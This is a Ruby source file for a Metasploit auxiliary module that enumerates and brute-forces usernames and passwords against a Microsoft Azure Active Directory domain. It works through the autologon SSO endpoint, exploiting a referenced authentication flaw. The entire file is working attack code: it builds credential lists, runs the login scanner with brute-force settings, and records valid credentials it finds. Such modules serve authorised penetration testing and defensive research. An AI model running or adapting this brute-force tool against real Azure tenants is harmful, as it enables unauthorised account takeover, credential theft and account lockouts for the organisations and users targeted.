##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/azure_ad_sso'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Microsoft Azure Active Directory Login Enumeration',
      'Description' => %q{
        This module enumerates valid usernames and passwords against a
        Microsoft Azure Active Directory domain by utilizing a flaw in
        how SSO authenticates.
      },
      'Author' => [
        'Matthew Dunn - k0pak4'
      ],
      'License' => MSF_LICENSE,
      'References' => [
        [ 'URL', 'https://arstechnica.com/information-technology/2021/09/new-azure-active-directory-password-brute-forcing-flaw-has-no-fix/'],
        [ 'URL', 'https://github.com/treebuilder/aad-sso-enum-brute-spray'],
      ],
      'DefaultOptions' => {
        'RPORT' => 443,
        'SSL' => true,
        'PASSWORD' => 'password'
      }
    )

    register_options(
      [
        OptString.new('RHOSTS', [true, 'The target Azure endpoint', 'autologon.microsoftazuread-sso.com']),
        OptString.new('DOMAIN', [true, 'The target Azure AD domain', '']),
        OptString.new('TARGETURI', [ true, 'The base path to the Azure autologon endpoint', '/winauth/trust/2005/usernamemixed']),
      ]
    )
  end

  def scanner(ip)
    @scanner ||= lambda {
      cred_collection = build_credential_collection(
        realm: datastore['DOMAIN'],
        username: datastore['USERNAME'],
        password: datastore['PASSWORD']
      )

      return Metasploit::Framework::LoginScanner::AzureAdSso.new(
        configure_http_login_scanner(
          host: ip,
          port: datastore['RPORT'],
          uri: normalize_uri("#{datastore['DOMAIN']}/#{datastore['TARGETURI']}"),
          cred_details: cred_collection,
          stop_on_success: datastore['STOP_ON_SUCCESS'],
          bruteforce_speed: datastore['BRUTEFORCE_SPEED']
        )
      )
    }.call
  end

  def report_good_cred(result)
    login_data = result.to_h
    login_data.merge!(
      module_fullname: fullname,
      workspace_id: myworkspace_id
    )
    cred_login = create_credential_and_login(login_data)
    cred_login.service.info = 'Azure AD'
    cred_login.service.save!
  end

  def report_bad_cred(result)
    invalidate_login(result.to_h)
  end

  def run
    hostname = datastore['RHOSTS']
    datastore['VHOST'] = hostname if datastore['VHOST'].blank?

    begin
      addr = Rex::Socket.getaddress(hostname)
    rescue SocketError
      fail_with(Failure::BadConfig, "Unable to resolve hostname #{datastore['RHOSTS']}")
    end

    # set RHOSTS to a range containing only the translated IP address
    datastore['RHOSTS'] = "#{addr}-#{addr}"

    super

    # restore RHOSTS to its original value
    datastore['RHOSTS'] = hostname
  end

  def run_host(ip)
    report_host({
      host: ip,
      name: vhost
    })
    scanner(ip).scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute(level: :good, ip: ip, msg: "Success: '#{result.credential}'")
        report_good_cred(result)
      when Metasploit::Model::Login::Status::NO_AUTH_REQUIRED
        print_brute(level: :good, ip: ip, msg: "Success: '#{result.proof}'")
        result.private_data = ''
        report_good_cred(result)
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        vprint_brute(level: :verror, ip: ip, msg: result.proof)
        report_bad_cred(result)
      when Metasploit::Model::Login::Status::INCORRECT
        vprint_brute(level: :verror, ip: ip, msg: "Failed: '#{result.credential}'")
        report_bad_cred(result)
      end
    end
  end

end
